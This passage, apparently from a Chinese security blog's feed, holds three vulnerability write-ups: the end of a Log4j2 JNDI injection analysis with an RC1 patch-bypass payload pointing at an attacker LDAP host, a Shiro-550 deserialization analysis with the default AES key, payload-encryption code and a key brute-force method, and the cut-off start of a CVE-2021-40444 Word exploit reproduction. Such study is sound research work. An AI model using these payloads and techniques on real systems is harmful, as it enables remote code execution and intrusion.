<p>方法中调用了 <code>org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute(org.apache.logging.log4j.core.LogEvent, java.lang.StringBuilder, int, int, java.util.List&lt;java.lang.String&gt;)</code></p>
<p>主要处理逻辑是递归，将日志进行处理</p>
<p>直到递归至 <code>log4j-core-2.14.1.jar!/org/apache/logging/log4j/core/lookup/StrSubstitutor.class:418</code></p>
<p>进入 <code>org.apache.logging.log4j.core.lookup.StrSubstitutor#resolveVariable</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/1639199711390.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">resolveVariable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String variableName, <span class="keyword">final</span> StringBuilder buf, <span class="keyword">final</span> <span class="keyword">int</span> startPos, <span class="keyword">final</span> <span class="keyword">int</span> endPos)</span> </span>&#123;</span><br><span class="line">    StrLookup resolver = <span class="keyword">this</span>.getVariableResolver();</span><br><span class="line">    <span class="keyword">return</span> resolver == <span class="keyword">null</span> ? <span class="keyword">null</span> : resolver.lookup(event, variableName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到一个很显眼的字符串 <code>lookup</code> 大概应该就是这里了</p>
<p>进行跟进呀</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/1639199898205.png"></p>
<p>这里将 <code>jndi:ldap://192.168.1.104:1389/e5iaop</code></p>
<p>进行了处理，处理后为 <code>ldap://192.168.1.104:1389/e5iaop</code> 传入到 <code>lookup.lookup(name)</code> 中</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/1639199976848.png"></p>
<p>程序猿码代码以 <code>log.info(&quot;[INFO] :&quot;+info);</code> 形式</p>
<p><code>info</code>参数可控的情况就会将恶意代码拼接在字符串中，从而导致JNDI注入触发漏洞</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/1639203628872.png"></p>
<h4 id="RC1绕过"><a href="#RC1绕过" class="headerlink" title="RC1绕过"></a>RC1绕过</h4><p>补丁：<a href="https://github.com/apache/logging-log4j2/commit/04637dd9102175f765cfad349de0c2a63c279ac3">https://github.com/apache/logging-log4j2/commit/04637dd9102175f765cfad349de0c2a63c279ac3</a></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/1639213952788.png"></p>
<p>通过补丁可以看出在 <code>org.apache.logging.log4j.core.pattern.</code></p>
<p><code>.SimpleMessagePatternConverter#format</code> 方法中删除了 Lookup 的判断，改成了直接拼接。</p>
<p>但是在源码的另一个子类 <code>LookupMessagePatternConverter</code> 可以看到当，对象被设置为 <code>LookupMessagePatternConverter</code> 还是可以进入到处理 <code>$&#123;&#125;</code> 的方法</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/1639214156599.png"></p>
<p>要想设置为 <code>LookupMessagePatternConverter</code>，需要开启lookups`功能</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/1639215647189.png"></p>
<p>开启方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Configuration config = <span class="keyword">new</span> DefaultConfigurationBuilder().build(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 配置开启lookup功能</span></span><br><span class="line"><span class="keyword">final</span> MessagePatternConverter converter =</span><br><span class="line">    MessagePatternConverter.newInstance(config, <span class="keyword">new</span> String[] &#123;<span class="string">&quot;lookups&quot;</span>&#125;);</span><br><span class="line"><span class="keyword">final</span> Message msg = <span class="keyword">new</span> ParameterizedMessage(<span class="string">&quot;$&#123;jndi:ldap://192.168.1.104:1389/Exploit&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">final</span> LogEvent event = Log4jLogEvent.newBuilder()</span><br><span class="line">    .setLoggerName(<span class="string">&quot;MyLogger&quot;</span>)</span><br><span class="line">    .setLevel(Level.DEBUG)</span><br><span class="line">    .setMessage(msg).build();</span><br><span class="line"><span class="keyword">final</span> StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">converter.format(event, sb);</span><br><span class="line">System.out.println(sb);</span><br></pre></td></tr></table></figure>

<p>最后触发漏洞的方法 <code>org.apache.logging.log4j.core.net.JndiManager#lookup</code> 中做了调整</p>
<p>加了几个白名单</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/1639216026647.png"></p>
<p>白名单如下：</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/1639216107112.png"></p>
<p>不过有趣的是，在异常报错捕获后，直接跳出函数了[哭笑]（不知道是不是太慌了）</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/1639216145259.png"></p>
<p>因为是 <code>URISyntaxException</code> URI异常捕获</p>
<p>所以尝试构造异常的URI，比如加个<code>空格</code></p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;</span><span class="symbol">jndi:</span><span class="symbol">ldap:</span>/<span class="regexp">/192.168.1.104:1389/</span> Exploit&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/1639216824048.png"></p>
<p>成功RCE，但需要开启lookup功能</p>
<h4 id="RC2修复"><a href="#RC2修复" class="headerlink" title="RC2修复"></a>RC2修复</h4><p><a href="https://github.com/apache/logging-log4j2/commit/c2b07e37995004555c211cdf0bb169d6a6a6f96b">https://github.com/apache/logging-log4j2/commit/c2b07e37995004555c211cdf0bb169d6a6a6f96b</a></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-12-18/1639216943179.png"></p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>



<h4 id="Ref"><a href="#Ref" class="headerlink" title="#Ref"></a>#Ref</h4><p><a href="https://xz.aliyun.com/t/10649#toc-2">https://xz.aliyun.com/t/10649#toc-2</a></p>
<p><a href="https://mp.weixin.qq.com/s/fWN9mqSKU2PWpZkl49lv8Q">https://mp.weixin.qq.com/s/fWN9mqSKU2PWpZkl49lv8Q</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>漏洞POC</tag>
        <tag>漏洞EXP</tag>
        <tag>Java</tag>
        <tag>JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化之温故知新（一）</title>
    <url>/2021/07/06/notes_20210706/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>shiro反序列化可以说是各大小演练中屡试不爽的洞，能成功利用基本上一打一个准，这个漏洞也算是经历了风雨的洗礼，各路大神的魔改及回显等骚操作，已经屡见不鲜了。这里根据前人的总结，做个学习笔记。</p>
<span id="more"></span>

<p>简单利用：</p>
<ul>
<li>通过在cookie的rememberMe字段中插入恶意payload，</li>
<li>触发shiro框架的rememberMe的反序列化功能，导致任意代码执行。</li>
<li>shiro 1.2.24中，提供了硬编码的AES密钥：<code>kPH+bIxk5D2deZiIxcaaaA==</code></li>
<li>由于开发人员未修改AES密钥而直接使用Shiro框架，导致了该问题</li>
</ul>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="0x01-加密过程"><a href="#0x01-加密过程" class="headerlink" title="0x01 加密过程"></a>0x01 加密过程</h5><p>首先，从硬编码存在类开始 <code>org.apache.shiro.mgt.AbstractRememberMeManager</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624349472136.png"></p>
<p><code>AbstractRememberMeManager</code> 类实现了 <code>RememberMeManager</code> 的方法，跟进类</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624349562789.png"></p>
<p>从字面上理解，就是登录成功的实现方法</p>
<p>跟进 <code>org.apache.shiro.mgt.RememberMeManager#onSuccessfulLogin</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624349626435.png"></p>
<p>在 <code>shiro-core-1.2.4.jar!/org/apache/shiro/mgt/AbstractRememberMeManager.class:83</code></p>
<p>中实现了该方法，所以在这里设下断点进行调试</p>
<p>访问登录页进行登录</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624349927417.png"></p>
<p>进入调试器</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624349985644.png"></p>
<p>跟进 <code>this.forgetIdentity</code> 方法，在方法内进行了cookie的操作</p>
<p><code>this.getCookie().removeFrom(request, response);</code> </p>
<p>跟进<code>this.getCookie().removeFrom</code>方法</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624350256492.png"></p>
<p>在这里可以看到出现了 <code>deleteMe</code> ，也是最常用的检测方式</p>
<p>继续往下调试</p>
<p>只要满足 <code>this.isRememberMe(token)</code> 为 true 就能进入 <code>this.rememberIdentity()</code> 方法</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624350592021.png"></p>
<p><code>principals</code> 参数是获取的登录用户名</p>
<p>继续跟进 <code>this.rememberIdentity</code> 方法</p>
<p>首先是将用户名传入到了 <code>this.convertPrincipalsToBytes</code>方法</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624359468467.png"></p>
<p>并且在方法中很明显能看到有一个加密方法 <code>this.encrypt</code></p>
<p>将用户名先序列化在进行加密，这里我们跟进一下加密方法是如何实现的</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624359619583.png"></p>
<p>先获取到一个 <code>cipherService</code> 加密服务类，将用户名的序列化结果传入 <code>cipherService.encrypt</code> 方法</p>
<p>可以看到加密的方式是 <code>AES/CBC/PKCS5Padding</code></p>
<p>在通过<code>this.getEncryptionCipherKey()</code>或取密钥，而获取的 <code>encryptionCipherKey</code> 参数值，在定义</p>
<p><code>AbstractRememberMeManager</code>类时，就默认初始化了默认Key</p>
<p><code>this.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624361600401.png"></p>
<p>然后带入  序列化数据和硬编码Key进行加密操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ByteSource <span class="title">encrypt</span><span class="params">(<span class="keyword">byte</span>[] plaintext, <span class="keyword">byte</span>[] key)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">byte</span>[] ivBytes = <span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">boolean</span> generate = <span class="keyword">this</span>.isGenerateInitializationVectors(<span class="keyword">false</span>);</span><br><span class="line">	<span class="keyword">if</span> (generate) &#123;</span><br><span class="line">		ivBytes = <span class="keyword">this</span>.generateInitializationVector(<span class="keyword">false</span>);</span><br><span class="line">		<span class="keyword">if</span> (ivBytes == <span class="keyword">null</span> || ivBytes.length == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Initialization vector generation is enabled - generated vectorcannot be null or empty.&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">this</span>.encrypt(plaintext, key, ivBytes, generate);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加密结束后，回到之前的函数继续跟进</p>
<p>进入 <code>org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity</code> </p>
<p>最终将加密后的数据进行base64编码，放入到cookie中</p>
<p>就是经常用到的 <code>rememberMe=xxx</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624361969876.png"></p>
<p><strong>小结</strong>：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">加密方式: AES/CBC/PKCS5Padding</span></span><br><span class="line"><span class="section">模式: CBC</span></span><br><span class="line"><span class="section">key: 就是默认的Key</span></span><br><span class="line"><span class="section">iv: 16位随机数</span></span><br></pre></td></tr></table></figure>

<p>python3</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes</span>(<span class="params">payload,key</span>):</span></span><br><span class="line">    BS   = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv   =  uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(base64.b64decode(payload))</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br></pre></td></tr></table></figure>



<h5 id="0x02-解密过程"><a href="#0x02-解密过程" class="headerlink" title="0x02 解密过程"></a>0x02 解密过程</h5><p>任然是在 <code>AbstractRememberMeManager</code> 实现的 <code>RememberMeManager</code>类接口进行切入，</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624412659014.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624412672052.png"></p>
<p>在 <code>AbstractRememberMeManager</code> class类中的 <code>getRememberedPrincipals</code>方法设下断点</p>
<p>页面点击退出登录，就能出发到断点，且可以获取到 Cookie中的 <code>rememberMe</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624412794194.png"></p>
<p>继续跟进方法 <code>getRememberedPrincipals</code></p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">public PrincipalCollection get<span class="constructor">RememberedPrincipals(SubjectContext <span class="params">subjectContext</span>)</span> &#123;</span><br><span class="line">        PrincipalCollection principals = null;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            byte<span class="literal">[]</span> <span class="built_in">bytes</span> = this.get<span class="constructor">RememberedSerializedIdentity(<span class="params">subjectContext</span>)</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">bytes</span> != null<span class="operator"> &amp;&amp; </span><span class="built_in">bytes</span>.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                principals = this.convert<span class="constructor">BytesToPrincipals(<span class="params">bytes</span>, <span class="params">subjectContext</span>)</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (RuntimeException var4) &#123;</span><br><span class="line">            principals = this.on<span class="constructor">RememberedPrincipalFailure(<span class="params">var4</span>, <span class="params">subjectContext</span>)</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return principals;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>继续进入 <code>this.getRememberedSerializedIdentity(subjectContext);</code></p>
<p>在方法内进行了 cookie中的 <code>rememberMe</code> 提取</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624413227352.png"></p>
<p>继续跟进，对获取到的 base64值进行了处理然后解码后返回字节数组</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624413448584.png"></p>
<p>返回上一层，继续进入 <code>this.convertBytesToPrincipals(bytes, subjectContext);</code> 方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">convertBytesToPrincipals</span><span class="params">(<span class="keyword">byte</span>[] bytes, SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            bytes = <span class="keyword">this</span>.decrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.deserialize(bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624413525739.png"></p>
<p>很明显可以看出，对数组进行解密操作 </p>
<p>跟进解密函数<code>this.decrypt(bytes);</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624413616605.png"></p>
<p>在这里和加密函数一样，也获取了一次密钥，同样也获取的是默认密钥 <code>kPH+bIxk5D2deZiIxcaaaA==</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624413710531.png"></p>
<p>从 <code>cipherService</code> 可以看到解密方式任然为 <code>AES/CBC/PKCS5Padding</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624414905611.png"></p>
<p>继续进入解密函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ByteSource <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] ciphertext, <span class="keyword">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] encrypted = ciphertext;</span><br><span class="line">        <span class="keyword">byte</span>[] iv = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.isGenerateInitializationVectors(<span class="keyword">false</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">int</span> ivSize = <span class="keyword">this</span>.getInitializationVectorSize();</span><br><span class="line">                <span class="keyword">int</span> ivByteSize = ivSize / <span class="number">8</span>;</span><br><span class="line">                iv = <span class="keyword">new</span> <span class="keyword">byte</span>[ivByteSize];</span><br><span class="line">                System.arraycopy(ciphertext, <span class="number">0</span>, iv, <span class="number">0</span>, ivByteSize);</span><br><span class="line">                <span class="keyword">int</span> encryptedSize = ciphertext.length - ivByteSize;</span><br><span class="line">                encrypted = <span class="keyword">new</span> <span class="keyword">byte</span>[encryptedSize];</span><br><span class="line">                System.arraycopy(ciphertext, ivByteSize, encrypted, <span class="number">0</span>, encryptedSize);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">                String msg = <span class="string">&quot;Unable to correctly extract the Initialization Vector or ciphertext.&quot;</span>;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> CryptoException(msg, var8);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decrypt(encrypted, key, iv);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进 <code>this.decrypt(encrypted, key, iv);</code></p>
<p>最后通过 <code>this.crypt(ciphertext, key, iv, 2);</code> 方法进行解密</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624417122879.png"></p>
<p>解密完成生成开头为<code>rO0ABXNy...</code>的字符串</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624417243464.png"></p>
<p><strong>小结</strong>：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">解密方式: AES/CBC/PKCS5Padding</span></span><br><span class="line"><span class="section">模式: CBC</span></span><br><span class="line"><span class="section">key: 就是默认的Key</span></span><br><span class="line"><span class="section">iv: 16位随机数</span></span><br></pre></td></tr></table></figure>

<p>python3</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes</span>(<span class="params">payload,key</span>):</span></span><br><span class="line">    BS   = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv   =  uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(base64.b64decode(payload))</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br></pre></td></tr></table></figure>



<h5 id="0x03-反序列化操作"><a href="#0x03-反序列化操作" class="headerlink" title="0x03 反序列化操作"></a>0x03 反序列化操作</h5><p>解密结束后会将序列化数据传入 <code>this.deserialize(bytes);</code> 进行反序列化操作</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624417479587.png"></p>
<p>跟进反序列化函数</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624418121934.png"></p>
<p>看到了久违的 <code>readObject()</code> ，反序列化操作结束</p>
<h4 id="PoC检测原理"><a href="#PoC检测原理" class="headerlink" title="PoC检测原理"></a>PoC检测原理</h4><p>首先要知道响应头的 <code>rememberMe=deleteMe</code> 什么时候生成，怎么生成</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624439811541.png"></p>
<p>在Cookie中添加 <code>rememberMe</code>，在未使用正确key的情况下，响应头会出现<code>rememberMe=deleteMe</code>，这就给漏洞验证及key的爆破提供了检测指标</p>
<p>进入断点</p>
<p>跟进 <code>this.convertBytesToPrincipals(bytes, subjectContext);</code> 方法</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624440158978.png"></p>
<p>发现在key不正确的情况下，会走向 <code>catch</code> 中 <code>this.onRememberedPrincipalFailure(var4, subjectContext);</code> 方法此时的 <code>principals</code> 为空</p>
<p>继续跟进 <code>onRememberedPrincipalFailure()</code> 方法</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624440431560.png"></p>
<p>进入 <code>this.forgetIdentity(context);</code></p>
<p>最后来到之前也出现过的 <code>this.getCookie().removeFrom(request, response);</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624440483316.png"></p>
<p>跟进 <code>removeFrom()</code> 方法</p>
<p>随后就将 <code>rememberMe=deleteMe</code> 设置到了响应头中</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624442564397.png"></p>
<p>这就是一个完整的key不正确时的流程</p>
<p>如何利用，来达到遍历key的效果？</p>
<p>首先走一遍流程</p>
<blockquote>
<p>获取Cookie中的 rememberMe  -&gt; Base64解码 -&gt; 代入Key解密 -&gt; 字节流反序列化 -&gt; 反序列化得到<code>PrincipalCollection</code>对象</p>
</blockquote>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624443405878.png"></p>
<p>最后的反序列化需要得到 <code>PrincipalCollection</code></p>
<p>思路：</p>
<p>生成一个固定的 <code>PrincipalCollection</code> 对象进行序列化，然后组合自定义Key进行加密，再向目标发送请求；如果目标的硬编码key与我们加密key一致，则会正确解密，响应头就不会出现 <code>rememberMe=deleteMe</code>，否则解密失败，则响应头会出现 <code>rememberMe=deleteMe</code></p>
<p>构造一个 <code>PrincipalCollection</code>，获取序列化数据</p>
<p>由于 <code>PrincipalCollection</code> 是一个接口</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624443735716.png"></p>
<p>所以需要找实现他方法或继承他的类</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624443785737.png"></p>
<p>通过寻找可以找到有两个类都能使用 <code>SimplePrincipalCollection</code> 、<code>SimplePrincipalMap</code></p>
<p>这里直接利用 <code>SimplePrincipalCollection</code> 来形成序列化数据</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624443960389.png"></p>
<p>生成后利用 base64 来验证是否能正确解密，key使用默认的硬编码</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-07-08/1624444037111.png"></p>
<p>可以看到正确解密，未出现 <code>rememberMe=deleteMe</code></p>
<p>接着只需要将字节流和key列表组合发包，就能爆破出正确的密钥</p>
<p>字节流如下</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">rO0ABXNyACtvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsTWFw</span>+BAnP<span class="number">8</span>g<span class="number">4</span>qCgCAAJMABJjb<span class="number">21</span>iaW<span class="number">5</span>lZFByaW<span class="number">5</span>jaXBhbHN<span class="number">0</span>AA<span class="number">9</span>MamF<span class="number">2</span>YS<span class="number">91</span>dGlsL<span class="number">01</span>hcDtMAA<span class="number">9</span>yZWFsbVByaW<span class="number">5</span>jaXBhbHNxAH<span class="number">4</span>AAXhwcHA=</span><br></pre></td></tr></table></figure>



<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><p><a href="https://zeo.cool/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/">https://zeo.cool/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/</a></p>
]]></content>
      <categories>
        <category>摸鱼记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>反序列化</tag>
        <tag>摸鱼记</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-40444 复现+上线CS</title>
    <url>/2021/09/13/online_cs_20210913/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>最近CVE-2021-40444有些火热，跟着大佬们一起复现一下，参考大佬们的分析文章</p>
<span id="more"></span>

<h4 id="样本分析并构造"><a href="#样本分析并构造" class="headerlink" title="样本分析并构造"></a>样本分析并构造</h4><p>一共捕获3个样本</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-13/1631384578068.png"></p>
<p>首先把样本扔到沙箱里跑一边</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-13/1631373865292.png"></p>
<p>发现对外请求了</p>
<h5 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h5><p>解压word样本，找到样本中的 <code>word\_rels\document.xml.rels</code>，找到这个请求连接</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-13/1631374025737.png"></p>
<p>把链接指向自己构造的html上  <code>http://&lt;HOST&gt;/exploit.html</code></p>
<h5 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h5><p>根据样本html构造 <code>exploit.html</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-13/1631374344632.png"></p>
<p>发现样本的<code>html</code>文件，使用了混淆的 <code>JavaScript</code>，但可以明显看到向外请求了 <code>.cab</code></p>
<p>这里将链接改为自己的链接 <code>http://&lt;HOST&gt;/exploit.cab</code></p>
<p>解压样本的 <code>.cab</code>，看到存在js中调用的 <code>championship.inf</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-09-13/1631374467248.png"></p>
<p>最后应该是吧 cab 加载到内存中执行，这么一来利用链算完整了</p>
<h5 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h5><p>构造一个 <code>cab</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">i686</span>-w<span class="number">64</span>-mingw<span class="number">32</span>-gcc -shared calc.c -o calc.dll</span><br></pre></td></tr></table></figure>

<p><code>calc.c</code> 如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exec</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	system(<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HINSTANCE hinstDLL,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD fdwReason, </span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpReserved )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>( fdwReason ) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">           exec(); </span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span 